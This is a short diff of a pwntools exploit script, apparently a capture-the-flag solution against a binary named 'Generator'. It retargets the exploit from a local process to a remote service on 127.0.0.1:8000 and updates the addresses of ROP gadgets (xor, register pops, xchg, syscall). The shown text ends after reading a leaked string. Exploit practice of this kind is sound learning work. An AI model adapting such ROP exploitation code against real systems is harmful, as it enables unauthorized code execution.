@@ -1,13 +1,14 @@
 from pwn import *
 
-r = process("./Generator")
+r = remote("127.0.0.1", 8000)
+#r = process("./Generator")
 
-xor_ptr_rdi_rsi = p64(0x4011FE)
-pop_rdi_rsi_rdx = p64(0x401202)
-pop_rsi_rdx		= p64(0x401203)
-xchg_rax_rdx	= p64(0x401206)
-syscall			= p64(0x401209)
-random_str		= p64(0x404080)
+xor_ptr_rdi_rsi = p64(0x40121e)
+pop_rdi_rsi_rdx = p64(0x401222)
+pop_rsi_rdx		= p64(0x401223)
+xchg_rax_rdx	= p64(0x401226)
+syscall			= p64(0x401229)
+random_str		= p64(0x404090)
 
 string = r.recvuntil(b"\n").split(b" ")[-1].strip()
 print(f"Leaked string: {string}")
